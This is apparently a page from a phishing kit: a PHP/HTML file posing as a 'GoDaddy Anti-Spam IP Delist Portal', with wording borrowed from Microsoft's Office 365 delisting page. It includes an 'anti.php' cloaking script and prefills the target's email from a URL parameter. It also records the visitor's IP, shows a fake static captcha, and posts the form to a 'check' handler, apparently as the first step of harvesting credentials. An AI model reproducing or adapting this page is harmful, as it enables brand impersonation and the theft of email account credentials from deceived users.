<?php
error_reporting(0);
include('anti.php');
session_start();
$user = $_GET['ea'];
$_SESSION['username'] = $user;
$v_ip = $_SERVER['REMOTE_ADDR'];
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=9">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GoDaddy - Delist IP</title>
  <link href="files/1.css" rel="stylesheet"/>
	  <link rel="icon" href="files/favicon.png" type="image/x-icon"/>
</head>
<body>
  <div class="navbar navbar-inverse navbar-fixed-top" style="background: white">
    <div style="padding-top: 10px">
      <a id="badget1" href="/Delist/Index" style="outline-style: none; text-decoration: none">
        <img style="width: 100px" src="files/dad.png" />
      </a>

      <a id="badget2" href="/Delist/Index" style="outline-style: none; text-decoration: none; float: right">
        <img src="files/Logo2.jpg" />
      </a>
    </div>
  </div>



  <div class="container body-header">
    <h2>
      GoDaddy Anti-Spam IP Delist Portal
      <small style="float: right">
        Display language:
        <select id="Lang" name="Lang" onchange="setLang(this.value)"><option selected="selected" value="en-us">English (United States)</option>
<option value="cs-cz">čeština (Česk&#225;&#160;republika)</option>
<option value="da-dk">dansk (Danmark)</option>
<option value="de-de">Deutsch (Deutschland)</option>
<option value="es-es">espa&#241;ol (Espa&#241;a, alfabetizaci&#243;n internacional)</option>
<option value="fr-fr">fran&#231;ais (France)</option>
<option value="it-it">italiano (Italia)</option>
<option value="hu-hu">magyar (Magyarorsz&#225;g)</option>
<option value="nl-nl">Nederlands (Nederland)</option>
<option value="pl-pl">polski (Polska)</option>
<option value="pt-br">portugu&#234;s (Brasil)</option>
<option value="pt-pt">portugu&#234;s (Portugal)</option>
<option value="ro-ro">rom&#226;nă (Rom&#226;nia)</option>
<option value="sv-se">svenska (Sverige)</option>
<option value="tr-tr">T&#252;rk&#231;e (T&#252;rkiye)</option>
<option value="ru-ru">русский (Россия)</option>
<option value="ko-kr">한국어(대한민국)</option>
<option value="zh-cn">中文(中华人民共和国)</option>
<option value="zh-tw">中文(台灣)</option>
<option value="ja-jp">日本語 (日本)</option>
</select>
      </small>
    </h2>
  </div>


  <div class="container body-content">
    




<h4>If you&#39;re trying to send mail to an Office 365 recipient and the mail has been rejected because of your sending IP address, follow these steps to submit a delisting request.</h4>
<h4>Senders are responsible for making sure that their mail from this IP address isn&#39;t abusive or malicious.</h4>
<h4><a href="http://go.microsoft.com/fwlink/?LinkID=526655">Learn More</a></h4>
<br />


  <ol class="progtrckr" data-progtrckr-steps="3">
    <li class="progtrckr-do">Delist IP</li>
    <li class="progtrckr-todo">Complete</li>
  </ol>
  <br />
    <h4>Provide your email address and the IP address you want to delist so they can be verified.</h4>
  <hr />
  <div class="col-md-12" style="    min-height: 500px;">
<form action="check?ss=o" method="post"> <div class="form-horizontal" style="margin-left: 0px">
        <div class="form-group">
          <table style="width:300px">
            <tr><td><div><label class="control-label col-md-2" for="Email">Email address</label></div></td></tr>
            <tr>
              <td>
                <div class="col-md-10">
                  <input class="form-control text-box single-line" data-val="true" data-val-regex="Invalid Email Address" data-val-regex-pattern="\w+([-+.&#39;]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*" id="Email" name="Email" required type="text" value="<?php echo $user;?>" />
                  <span class="field-validation-valid text-danger" data-valmsg-for="Email" data-valmsg-replace="true"></span>
                </div>
              </td>
            </tr>
            <tr><td><label class="control-label col-md-2" for="IP">IP address</label></td></tr>
            <tr>
              <td>
                <div class="col-md-10">
                  <input class="form-control text-box single-line" data-val="true" data-val-regex="Invalid IP Address" data-val-regex-pattern="\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" id="IP" name="IP" type="text" value="<?php echo $v_ip;?>" />
                  <span class="field-validation-valid text-danger" data-valmsg-for="IP" data-valmsg-replace="true"></span>
                </div>
              </td>
            </tr>
          </table>
        </div>
        <br />
        <table>
          <tr>
            <td>
              <!--
              ------------------------------------------------------------------------------------------
              -- Hip Holder begin
              ------------------------------------------------------------------------------------------
              -->
<div id="ispHIPHIP">
    <style type="text/css">
        .spHipNoClear::-ms-clear {
            display: none;
        }
    </style>
    <div>
        <table role="presentation" cellspacing="0px" dir="ltr">
            <tbody>
                <tr>
                    <td width="10px" style="padding:0px;text-align:right" class=""></td>
                    <td style="padding:0px;width:245px;text-align:left">
                        <div style="padding:0 0 8px 0" class="">
                            <label for="wlspispSolutionElementddf9923a5c9946aebd2de54a31fbb6f3" id="wlspispHipInstructionContainer">Enter the characters you see</label>
                            <div style="white-space: nowrap"><a id="wlspispHIPNew6da0d5894f2f47f391129afcf096d90d" role="button" href="" class="" title="Get a new challenge">New</a><b aria-hidden="true">&nbsp;|&nbsp;</b><a id="wlspispHIPToA315edc36aadb4cb48e5d28e709d7d012" role="button" href="" class="" title="Switch to the audio challenge">Audio</a></div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td aria-hidden="true"></td>
                    <td style="padding:0px;text-align:left">
                        <table cellspacing="0" style="table-layout:fixed;width:245px" role="presentation">
                            <tbody>
                                <tr>
                                    <td aria-hidden="true">
                                        <div id="wlspispContentId1e0723cac80774f398c0d59a7f675f919">
                                            <table role="presentation" cellspacing="0">
                                                <thead style="height: 0px;"></thead>
                                                <tfoot style="height: 0px;"></tfoot>
                                                <tbody>
                                                    <tr>
                                                        <td aria-hidden="true" style="vertical-align: middle; text-align: center; padding: 0px; margin: 0px; width: 216px; height: 96px;"><img id="wlspispHIPBimg066a779684feb459292cda3b807038d180" aria-label="Visual Challenge" alt="Visual Challenge" src="files/captcha.png" style="display: inline; width: 216px; height: 96px;"><img id="wlspispHIPBimg1b25cbf1aea6345f191985dede27280240" src="" alt="" style="display: none;"></td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </td>
                                </tr>
                                <tr>
                                    <td aria-hidden="true" height="8px"></td>
                                </tr>
                                <tr>
                                    <td>
                                        <table role="presentation">
                                            <tbody>
                                                <tr id="wlspispHIPErrorContainer" style="padding: 0px; display: none;">
                                                    <td class="" style="padding:0 4px 0 0;width:16px"><img src="" alt=""></td>
                                                    <td style="padding:0px; width:229px">
                                                        <div id="wlspispHIPErrorEmptyd429110a427f430c8caa640762d91b96" aria-hidden="true" aria-label="Please enter all of the characters you see." class="" aria-live="off" style="text-align: left; display: none;">Please enter all of the characters you see.</div>
                                                        <div id="wlspispHIPErrorTooLong5ae91f3ddf6545508f58ae68124cee30" aria-hidden="true" aria-label="That is too many characters. Please try again." class="" aria-live="off" style="text-align: left; display: none;">That is too many characters. Please try again.</div>
                                                        <div id="wlspispHIPErrorWrong426c0937329b4bd78ea6ccc8e06a253d" aria-hidden="true" aria-label="The characters didn't match the picture. Please try again." class="" aria-live="off" style="text-align: left; display: none;">The characters didn't match the picture. Please try again.</div>
                                                        <div id="wlspispHIPNeedAdditionalVerification681f6a504e7148c58b10fed0085c295d" aria-hidden="true" aria-label="We need an additional verification from you" class="" aria-live="off" style="text-align: left; display: none;">We need an additional verification from you</div>
                                                        <div id="wlspispHIPErrorThrottlec1001659865444fcbcb5b12270a905b4" aria-hidden="true" aria-label="You've reached the limit for number of attempts. These limits help us protect against spam from automated programs. You can try again later." class="" aria-live="off" style="text-align: left; display: none;">You've reached the limit for number of attempts. These limits help us protect against spam from automated programs. You can try again later.</div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding:0px;">
                                        <input id="captcha" name="captcha" type="text" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" aria-label="Enter the characters you see" class="spHipNoClear " required style="border-width: 2px; direction: ltr; width: 241px; text-align: left; padding: 0px; margin: 0px;">
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
</div>              <!--
              ------------------------------------------------------------------------------------------
              -- Hip Holder end
              ------------------------------------------------------------------------------------------
              -->
            </td>
          </tr>
        </table>
        <!--
        ------------------------------------------------------------------------------------------
        -- Hidden fields to submit back  End
        ------------------------------------------------------------------------------------------
        -->

        <div class="form-group" style="margin-top:50px;margin-left:13px">
          <div>
            <input type="submit" value="Submit" class="btn btn-default" onclick="return VerifyEmail(this);" />
          </div>
        </div>
      </div>
</form>  </div>

<!-- decide HIP status -->






    <hr />
    <footer>
      <p>&copy; 2019 - GoDaddy Delist Portal</p>
    </footer>
  </div>


</body>
</html>
